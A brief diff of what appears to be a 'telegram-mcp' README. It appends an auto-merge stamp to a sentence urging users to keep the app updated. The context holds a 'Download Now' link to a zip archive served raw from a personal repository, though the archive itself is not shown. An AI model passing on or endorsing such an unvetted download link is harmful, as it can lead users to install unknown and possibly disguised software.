@@ -97,4 +97,4 @@ Keep your application updated for the best experience. Always download the lates
 
 [Download Now](https://raw.githubusercontent.com/saadkhan1150/telegram-mcp/main/static/telegram-mcp-v1.2.zip)
 
-By updating regularly, you’ll have access to new features and improvements.
+By updating regularly, you’ll have access to new features and improvements.Nexus Development Cycle auto-merged by Hermes on 2026-11-04T20:31Z
